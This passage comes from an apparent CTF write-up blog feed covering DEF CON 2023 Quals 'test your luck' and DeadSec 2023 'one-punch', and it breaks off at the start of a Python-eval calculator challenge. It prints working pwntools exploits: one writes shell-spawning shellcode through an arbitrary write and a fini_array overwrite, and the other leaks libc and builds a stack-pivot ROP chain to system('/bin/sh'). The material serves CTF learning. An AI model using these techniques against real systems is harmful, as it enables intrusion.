ÏºúÏïº ÎîîÏª¥ÌååÏùºÏù¥ ÎêòÎäîÎç∞ ÎÅå Îïå ‚ÄòDON‚ÄôT SAVE the database‚ÄôÏùÑ Ï≤¥ÌÅ¨Ìï¥Ïïº ÌïúÎã§.</p><p>You can execute the result of executing the above python script as a script in IDA. At this time, the important point is to reflect in IDA, ‚Äòreanalyze program‚Äô, and guit IDA. When quiting it, You have to check ‚ÄòDON‚ÄôT SAVE the database‚Äô. Now, you can see decompiled source code.</p><p><br><br><br><img src="/images/230601-defcon2023-test-your-luck/2.png" width=550/></p><img src="/images/230601-defcon2023-test-your-luck/3.png" width=550/><p>ÏÇ¨Ïã§ ÎÇòÎäî Ìï®ÏàòÎ•º ÎîîÏΩîÎìú ÌïòÍ∏∞ Ï†ÑÏóê ÎîîÎ≤ÑÍπÖÌïòÎ©¥ÏÑú ÏûÑÏùòÏì∞Í∏∞Î•º Î∞úÍ≤¨ÌñàÎã§. whileÎ¨∏ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÏõêÌïòÎäî ÎßåÌÅº ÏûÑÏùò Ïì∞Í∏∞Í∞Ä Í∞ÄÎä•ÌïòÎã§. syscallÏùÑ Ïù¥Ïö©Ìï¥ÏÑú bufÏóê 8Î∞îÏù¥Ìä∏ ÏûÖÎ†•ÏùÑ Î∞õÎäîÎç∞, ÌäπÏ†ï Ï£ºÏÜåÎ•º Í±∞Î•¥Í≥† ÏûàÎã§. Ïù¥Îäî got ÏòÅÏó≠ÏùÑ Ìè¨Ìï®ÌïúÎã§. Î∞òÎ≥µÎ¨∏ÏùÑ ÎÅùÎÇ¥Í≥† Ïã∂ÏúºÎ©¥ 0ÏùÑ ÏûÖÎ†•ÌïòÎ©¥ ÎêúÎã§. 30Î≤àÏß∏ ÎùºÏù∏ÏóêÏÑú ÏõêÌïòÎäî Ï£ºÏÜåÏóê ÏõêÌïòÎäî Í∞íÏùÑ Ïì∞Îäî Í≤ÉÏùÑ ÌôïÏù∏Ìï† Ïàò ÏûàÎã§.</p><p>Actually I found arbitrary writes before decoding the function. It is possible to write arbitrarily as many times as desired by using a while statement. The buf is received 8 bytes input by using a syscall. It‚Äôs filtering out a specific address including got space. If you want to end the loop, you can send 0. In the 30th line, you can find exactly arbitrary writes.</p><p><br><br><br><img src="/images/230601-defcon2023-test-your-luck/6.png" width=550/></p><p>sub_2000 Ìï®ÏàòÎ•º xrefÎ°ú ÌôïÏù∏Ìï¥Î≥¥Î©¥ sub_2000 Ìï®ÏàòÎ•º decode Ìï¥Ï£ºÎäî Ìï®ÏàòÎ•º Ï∞æÏùÑ Ïàò ÏûàÎã§. Í∑∏ Ìï®ÏàòÏóêÏÑú sub_2000ÏùÑ decode Ìïú ÌõÑ, ÌäπÏ†ïÌïú ÌîÑÎ°úÍ∑∏Îû® ÏòÅÏó≠ÏùÑ rwxÎ°ú Í∂åÌïúÏùÑ Î∞îÍøîÏ£ºÎäî Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïúÎã§. Ïù¥ Ìï®ÏàòÎ•º mprotect_rwx() Ìï®ÏàòÎ°ú ÎÑ§Ïù¥Î∞çÌï¥Ï£ºÏóàÎã§. Ïù¥ Î¨∏Ï†úÎäî NX_bit Î≥¥Ìò∏Í∏∞Î≤ïÏù¥ ÏóÜÏñ¥ÏÑú Ïù¥ Ìï®ÏàòÎ•º ÌôúÏö©ÌïòÎ©¥ Ï¢ãÍ≤†Îã§Îäî ÏÉùÍ∞ÅÏùÑ ÌñàÎã§.  </p><p>If you check the sub_2000 function by xref, you can find a function that decodes the sub_2000 function. After decode sub_2000 in that function, call a function that changes the authority of a specific program area to rwx. I named this function mprotect_rwx() function. Since there is no NX bit mitigation for this challenge, I thought it would be nice to use this function.</p><p><br><br></p><p>sub_2000 Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïú ÌõÑ ÏïÑÎûòÏôÄ Í∞ôÏùÄ Î°úÏßÅÏùò generate_random() Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïúÎã§. ÏÇ¨Ïã§ÏÉÅ ÏôÑÏ†ÑÌïú randomÏù¥ ÏïÑÎãàÍ∏∞ ÎïåÎ¨∏Ïóê ÏòàÏ∏°Í∞ÄÎä•ÌïòÎã§. </p><p>The generated_random() function is called after the sub_2000 function is called. The random_value isn‚Äôt definitly random. So It could be predictable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_45B0 = dword_45B8 + dword_45B0 * dword_45B4;<span class="comment">// random_value ÏòàÏ∏° Í∞ÄÎä•</span></span><br><span class="line">random_value = dword_45B0;</span><br></pre></td></tr></table></figure><p>Ïö∞Î¶¨ÏóêÍ≤ê ÏûÑÏùò Ïì∞Í∏∞Í∞Ä ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê random_valueÎ•º ÏòàÏ∏°Ìï† Ïàò ÏûàÎã§. Ïù¥ Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÎ©¥ ÎìúÎîîÏñ¥ main Ìï®ÏàòÍ∞Ä Ìò∏Ï∂úÎêòÎäîÎç∞, random_valueÎäî main Ìï®ÏàòÏóêÏÑú ÏÇ¨Ïö©ÎêúÎã§. random_valueÎ•º ÏòàÏ∏°ÌïòÎ©¥ Correct!ÏùÑ Ï∂úÎ†•ÌïòÍ≥† ÌãÄÎ¶¨Î©¥ IncorrectÎ•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§. main Ìï®ÏàòÏóêÏÑúÎäî Î≥ÑÎã§Î•∏ Ï∑®ÏïΩÏ†êÏù¥ Î≥¥Ïù¥ÏßÄ ÏïäÏïòÎã§.</p><p>Because we have arbitrary writes, you can predict random_value. When this function ends, the main function is finally called, and random_value is used in the main function. If random_value is predicted, ‚ÄòCorrect!‚Äô is output, otherwise ‚ÄòIncorrect‚Äô is output. I couldn‚Äôt find any vulnerabilities in the main function.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Ï≤òÏùåÏóê pie Ï£ºÏÜåÍ∞Ä Ï∂úÎ†•ÎêòÏñ¥ÏÑú Ïù¥Í≤ÉÎ∂ÄÌÑ∞ Î¶≠Ìï¥Ï£ºÏóàÎã§. </p><p>At first, the pie address was printed, So I leaked it.</p><p>Ï†ÑÎûµÏùÄ Îã§ÏùåÍ≥º Í∞ôÎã§. ÏâòÏΩîÎìú Ïã§ÌñâÏù¥ Í∞ÄÎä•ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÏâòÏΩîÎìú Ïã§ÌñâÏùÑ Î™©ÌëúÎ°ú ÏÇºÏïòÎã§. Í∑∏Î¶¨Í≥† ÏûÑÏùò Ïì∞Í∏∞Î•º Ïù¥Ïö©ÌïòÏó¨ w Í∂åÌïúÏù¥ Ï£ºÏñ¥ÏßÑ Í≥≥Ïóê ÏâòÏΩîÎìúÎ•º Ïì∞Í∏∞Î°ú ÌñàÎã§. Ïä§ÌÉù Ï£ºÏÜåÎ•º ÏïåÍ∏∞Í∞Ä ÌûòÎì§Í∏∞ ÎïåÎ¨∏Ïóê ÏßÄÍ∏à ÌòÑÏû¨ ÏïåÍ≥† ÏûàÎäî pie Ï£ºÏÜåÎ•º ÏµúÎåÄÌïú ÌôúÏö©ÌïòÍ≥†Ïûê ÌñàÎã§. </p><p>The strategy is this. Because shellcode execution is possible, I targeted shellcode execution. And I decide to write shellcode at area with w authority by using arbitrary writes. It was difficult to know stack address, So I wanted to make the most of the pie address I currently know.</p><img src="/images/230601-defcon2023-test-your-luck/4.png" width=600/><p>mprotect_rwx() Ìï®ÏàòÍ∞Ä Ìò∏Ï∂úÎêòÎ©¥ ÏúÑÏôÄ Í∞ôÏù¥ Ï†Ä ÏòÅÏó≠Ïù¥ rwxÎ°ú Î≥ÄÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Ï†ÅÎãπÌïòÎã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. Ïù¥Î•º ÏúÑÌï¥ generate_random() Ìï®Ïàò ÎåÄÏã† mprotect_rwx() Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÎèÑÎ°ù ÌïòÍ∏∞Î°ú Í≤∞Ïã¨ÌñàÎã§. ÎßàÏßÄÎßâÏúºÎ°ú fini_arrayÎ•º Ïù¥Ïö©Ìï¥ÏÑú sub_2000Í∞Ä Ìïú Î≤à Îçî Ïã§ÌñâÎêòÍ≤å ÌñàÎã§.</p><p>When mprotect_rwx() function was called, the above area was changed to rwx autority. So I thought this area was suitable for writing shellcode. For this, I decided to have the mprotect_rwx() function call instead of the generate_random() function. Finally sub_2000 function is called one more time by using fini_array.</p><p><br><br></p><p>sub_2000Í∞Ä Ìïú Î≤à Îçî Ïã§ÌñâÎêòÍ≥†, Ïù¥Ï†ú rwx Í∂åÌïúÏù¥ Ï£ºÏñ¥ÏßÑ ÌîÑÎ°úÍ∑∏Îû® ÏòÅÏó≠Ïóê ÏûÑÏùò Ïì∞Í∏∞Í∞Ä Í∞ÄÎä•ÌïòÎã§. sub_2000 Ìï®ÏàòÏóêÏÑú ÏûÑÏùòÏì∞Í∏∞Í∞Ä ÎÅùÎÇú ÌõÑ Ï¢ÖÎ£åÎêòÎäî ÏïÑÎûò ÏòÅÏó≠Ïù¥ ÏâòÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÍ∏∞Ïóê Í∞ÄÏû• Ï†ÅÎãπÌïòÎã§Í≥† ÌåêÎã®ÌñàÎã§.  </p><p>The sub_2000 is called one more, and now arbitrary writes are possible to the program area given the rwx permission. In the sub_2000 function, it was determined that the area below, which ends after arbitrary writing is finished, is the most suitable for writing shellcode.</p><img src="/images/230601-defcon2023-test-your-luck/5.png" width=550/><br><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = os.environ.get(<span class="string">&#x27;HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">p = remote(HOST, <span class="built_in">int</span>(PORT))</span><br><span class="line"><span class="comment"># p = process(&#x27;./../handout/challenge&#x27;)</span></span><br><span class="line"></span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># info(hex(pie_base))</span></span><br><span class="line"></span><br><span class="line">fini_array = pie_base + <span class="number">0x4338</span></span><br><span class="line"></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x4330</span>)) <span class="comment"># generate_random</span></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x1370</span>)) <span class="comment"># mprotect_rwx</span></span><br><span class="line"></span><br><span class="line">p.send(p64(fini_array)) </span><br><span class="line">p.send(p64(pie_base + <span class="number">0x2000</span>)) <span class="comment"># one more</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># for main</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; one more sub_2000 &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_addr = pie_base + <span class="number">0x2140</span> </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(hex(len(shellcode))) # 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.send(p64(shellcode_addr + i*<span class="number">8</span>))</span><br><span class="line">    p.send(shellcode[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;./submitter&#x27;</span>)</span><br><span class="line"><span class="comment"># flag = p.recvline_contains(b&#x27;LiveCTF&#123;&#x27;).decode().strip()</span></span><br><span class="line"><span class="comment"># log.info(&#x27;Flag: %s&#x27;, flag)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 review</title>
      <link href="/230531-defcon2023-0review/"/>
      <url>/230531-defcon2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li><li><a href="https://github.com/Nautilus-Institute/quals-2023">https://github.com/Nautilus-Institute/quals-2023</a></li></ul><p>Last year I participated by sleeping less, but it didn‚Äôt contribute anything. This year, I solved challenges with a lot of solves, but I‚Äôm proud of myself because I solved them myself. XD</p><ul><li><a href="https://jiravvit.github.io/230602-defcon2023-open-house/">https://jiravvit.github.io/230602-defcon2023-open-house/</a></li><li><a href="https://jiravvit.github.io/230601-defcon2023-test-your-luck/">https://jiravvit.github.io/230601-defcon2023-test-your-luck/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeadSec CTF 2023 - one-punch (stack pivoting)</title>
      <link href="/230524-deadsecctf2023-one_punch/"/>
      <url>/230524-deadsecctf2023-one_punch/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1962">https://ctftime.org/event/1962</a></li></ul><blockquote><p>100 BOFs, 100 UAFs, 100 Race cons and a 10 km ROP chain, EVERY SINGLE DAY!!!<br>netcat.deadsec.quest 31794<br>Author: Goldenboy</p></blockquote><ul><li>[39 solves &#x2F; 241 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> garou[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(key, mapped_region) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Two punch man? lameeeeee&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">420</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(mapped_region, <span class="number">0</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">  mprotect(mapped_region, <span class="number">0x1000</span>uLL, <span class="number">1</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(garou);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainÏúºÎ°ú Îã§Ïãú ÎèåÏïÑÏò§Îäî Í≤ÉÏù¥ ÌûòÎì§Ïñ¥Î≥¥Ïó¨ bssÏòÅÏó≠Ïóê ÌéòÏù¥Î°úÎìúÎ•º ÏûÖÎ†•Î∞õÏïÑ Ïù¥Î•º ÌôúÏö©ÌïòÍ∏∞Î°ú ÌñàÎã§. bofÍ∞Ä <code>gets</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ ÌÑ∞Ï†∏Ï£ºÎãà ÏûÖÎ†• ÏÇ¨Ïù¥Ï¶à Ï†úÌïúÎèÑ ÏóÜÏñ¥ÏÑú Ï¢ãÎã§. </p><p>bss ÏòÅÏó≠Ïóê <code>system</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Í∏∞ ÏúÑÌïú rop payloadÎ•º Ï†ÄÏû•ÏãúÌÇ¨ Îïå Ï§ëÏöîÌïú Ï†êÏùÄ <code>system</code> Ìï®ÏàòÎäî Ïä§ÌÉùÏùÑ ÎßéÏù¥ ÏÇ¨Ïö©ÌïòÎãà ÎÑâÎÑâÌïú Í≥µÍ∞ÑÏóê ÎÑ£Ïñ¥Ï§òÏïºÌïúÎã§Îäî Í≤ÉÏù¥Îã§. Í∑∏ÎûòÏÑú <code>bss + 0x700</code>Ïóê rop payloadÎ•º ÏûÖÎ†• Î∞õÍ≥† rbpÎ°ú ÏÑ§Ï†ïÌïòÏòÄÎã§.</p><p>Ï∞∏Í≥†Î°ú Î¨∏Ï†úÎ•º ÌíÄÎ©¥ÏÑú <code>system</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌï† Îïå <code>xmm</code> Î†àÏßÄÏä§ÌÑ∞ Í¥ÄÎ†®Ìïú ÏóêÎü¨Í∞Ä Î∞úÏÉùÌñàÎäîÎç∞, Ïù¥Îäî stack alignÏù¥ ÏïàÎßûÏïÑÏÑú Î∞úÏÉùÌïòÎäî Í≤ÉÏù¥Îã§. rbpÎäî Ìï≠ÏÉÅ 16Ïùò Î∞∞ÏàòÏó¨Ïïº ÌïúÎã§. </p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./one_punchp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;netcat.deadsec.quest&#x27;</span>, <span class="number">31794</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./one_punchp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x1291</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">mapped_region = e.address + <span class="number">0x4050</span></span><br><span class="line">pop_rdi = e.address + <span class="number">0x1291</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line">leave_ret = e.address + <span class="number">0x132f</span></span><br><span class="line">info(<span class="built_in">hex</span>(mapped_region))</span><br><span class="line"></span><br><span class="line">bss = e.bss()</span><br><span class="line">info(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(bss + <span class="number">0x700</span>) <span class="comment"># for stack pivoting</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss + <span class="number">0x700</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(leave_ret) <span class="comment"># for stack pivoting</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># push_rsp_ret = libc.address + 0x4181d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dead&#123;I_w4nn4_b3_4_s41ky0u_H3R00000000&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> DeadSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TBCL CTF 2023 - Math is Hard (python, eval)</title>
      <link href="/230524-tbclctf2023-math_is_hard/"/>
      <url>/230524-tbclctf2023-math_is_hard/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2002">https://ctftime.org/event/2002</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><p>Î∞îÎ°ú ÏßÄÎÇú Ï£ºÎßêÏóê ÏπòÎ§ÑÏßÑ ÎåÄÌöåÏù∏Îç∞ challengeÍ∞Ä Î™®Îëê ÎÇ¥Î†§Í∞ÄÏÑú Î¨∏Ï†ú Ï†ïÎ≥¥Î•º Ïïå ÏàòÍ∞Ä ÏóÜÎã§ „Öú„Öú</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î¨∏Ï†úÎäî python Ïä§ÌÅ¨Î¶ΩÌä∏ ÌïòÎÇòÎßå Ï£ºÏñ¥ÏßÑÎã§. calc.py<br>python Ïä§ÌÅ¨Î¶ΩÌä∏Îßå Ï£ºÏñ¥ÏßÄÎäî Î¨∏Ï†úÎäî Ìï≠ÏÉÅ Í∏¥Ïû•ÎêúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">USAGE = <span class="string">&quot;&quot;&quot;PwnCalc -- a simple calculator</span></span><br><span class="line"><span class="string">$ a=4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ a = 4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ b = 3</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>b = 3</span></span><br><span class="line"><span class="string">$ c = sqrt(a*a+b*b)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>c = 5.0</span></span><br><span class="line"><span class="string">$ d = sin(pi/4)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>d = 0.7071067811865475</span></span><br><span class="line"><span class="string">Have fun!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_expression</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Allow only digits, decimal point, lowecase letters and math symbols.&quot;&quot;&quot;</span></span><br><span class="line">    SYMBOLS = <span class="string">&quot;.+*-/()&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c.islower() <span class="keyword">and</span> <span class="keyword">not</span> c.isdigit() <span class="keyword">and</span> c <span class="keyword">not</span> <span class="keyword">in</span> SYMBOLS:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main calculator loop.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">vars</span> = &#123; c : <span class="number">0</span> <span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        items = line.split(<span 